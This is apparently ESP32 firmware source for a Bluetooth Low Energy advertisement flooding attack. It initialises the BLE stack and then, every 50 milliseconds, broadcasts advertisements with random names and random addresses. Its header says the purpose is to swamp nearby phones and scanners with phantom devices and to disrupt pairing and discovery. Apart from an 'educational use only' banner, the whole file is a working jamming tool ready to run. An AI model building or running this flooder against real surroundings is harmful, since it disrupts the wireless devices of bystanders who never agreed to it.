/*
 * ble_attacks.cpp — Bluetooth disruption via advertisement flooding
 *
 * ================================================================
 *  ⚠ EDUCATIONAL / DEFENSIVE RESEARCH USE ONLY
 *  This code is for authorized lab testing and defensive
 *  cybersecurity education in controlled environments.
 * ================================================================
 *
 * Floods BLE advertisement space with randomized advertisements.
 * This causes nearby BLE scanners (phones, etc.) to see a large
 * number of phantom devices, potentially disrupting BLE pairing
 * and discovery within range.
 */

#include "ble_attacks.h"
#include "esp_bt.h"
#include "esp_bt_main.h"
#include "esp_gap_ble_api.h"
#include "esp_bt_device.h"

static BleAttackState _state = BATK_IDLE;
static uint32_t _advCount = 0;
static unsigned long _lastAdv = 0;
static bool _bleControllerReady = false;

#define BLE_FLOOD_INTERVAL_MS  50   // Time between advertisement changes
#define BLE_ADV_DATA_MAX_LEN   31

/*
 * Generate a random BLE advertisement name (8 chars)
 */
static void _randomName(char* buf, uint8_t len) {
  for (uint8_t i = 0; i < len; i++) {
    buf[i] = 'A' + (esp_random() % 26);
  }
  buf[len] = '\0';
}

/*
 * Generate random MAC-like bytes
 */
static void _randomMAC(uint8_t mac[6]) {
  for (int i = 0; i < 6; i++) {
    mac[i] = esp_random() & 0xFF;
  }
  mac[0] |= 0xC0;  // Set local + multicast bits for random addr
}

void ble_attacks_init() {
  DBGLN(F("[BATK] BLE attacks subsystem initialized"));
}

/*
 * ble_attacks_flood_start()
 * Initializes the BLE controller and starts flooding.
 */
void ble_attacks_flood_start() {
  // Release classic BT memory to free heap
  esp_bt_controller_mem_release(ESP_BT_MODE_CLASSIC_BT);

  esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
  if (esp_bt_controller_init(&bt_cfg) != ESP_OK) {
    DBGLN(F("[BATK] BT controller init failed"));
    return;
  }
  if (esp_bt_controller_enable(ESP_BT_MODE_BLE) != ESP_OK) {
    DBGLN(F("[BATK] BT controller enable failed"));
    return;
  }
  if (esp_bluedroid_init() != ESP_OK) {
    DBGLN(F("[BATK] Bluedroid init failed"));
    return;
  }
  if (esp_bluedroid_enable() != ESP_OK) {
    DBGLN(F("[BATK] Bluedroid enable failed"));
    return;
  }

  _bleControllerReady = true;
  _advCount = 0;
  _lastAdv = 0;
  _state = BATK_RUNNING;
  DBGLN(F("[BATK] BLE flood started"));
}

/*
 * ble_attacks_flood_stop()
 * Stops advertising and de-initializes the BLE stack.
 */
void ble_attacks_flood_stop() {
  if (_bleControllerReady) {
    esp_ble_gap_stop_advertising();
    esp_bluedroid_disable();
    esp_bluedroid_deinit();
    esp_bt_controller_disable();
    esp_bt_controller_deinit();
    _bleControllerReady = false;
  }
  _state = BATK_STOPPED;
  DBGF("[BATK] BLE flood stopped. Total adverts: %lu\n", _advCount);
}

/*
 * ble_attacks_update()
 * Non-blocking — sends a new randomized advertisement every
 * BLE_FLOOD_INTERVAL_MS.
 */
void ble_attacks_update() {
  if (_state != BATK_RUNNING || !_bleControllerReady) return;

  unsigned long now = millis();
  if (now - _lastAdv < BLE_FLOOD_INTERVAL_MS) return;
  _lastAdv = now;

  // Stop current advertisement
  esp_ble_gap_stop_advertising();

  // Generate random device name
  char name[9];
  _randomName(name, 8);

  // Build advertisement data with the random name
  uint8_t nameLen = strlen(name);
  esp_ble_adv_data_t advData = {};
  advData.set_scan_rsp        = false;
  advData.include_name        = true;
  advData.include_txpower     = false;
  advData.min_interval        = 0x20;
  advData.max_interval        = 0x40;
  advData.appearance          = 0x00;
  advData.manufacturer_len    = 0;
  advData.p_manufacturer_data = NULL;
  advData.service_data_len    = 0;
  advData.p_service_data      = NULL;
  advData.service_uuid_len    = 0;
  advData.p_service_uuid      = NULL;
  advData.flag                = (ESP_BLE_ADV_FLAG_GEN_DISC | ESP_BLE_ADV_FLAG_BREDR_NOT_SPT);

  // Set the device name
  esp_ble_gap_set_device_name(name);
  esp_ble_gap_config_adv_data(&advData);

  // Set random address for each advertisement
  uint8_t randAddr[6];
  _randomMAC(randAddr);
  esp_ble_gap_set_rand_addr(randAddr);

  // Start advertising
  esp_ble_adv_params_t advParams = {};
  advParams.adv_int_min       = 0x20;
  advParams.adv_int_max       = 0x40;
  advParams.adv_type          = ADV_TYPE_NONCONN_IND;
  advParams.own_addr_type     = BLE_ADDR_TYPE_RANDOM;
  advParams.channel_map       = ADV_CHNL_ALL;
  advParams.adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY;

  esp_ble_gap_start_advertising(&advParams);

  _advCount++;
}

BleAttackState ble_attacks_getState() {
  return _state;
}

uint32_t ble_attacks_getAdvCount() {
  return _advCount;
}
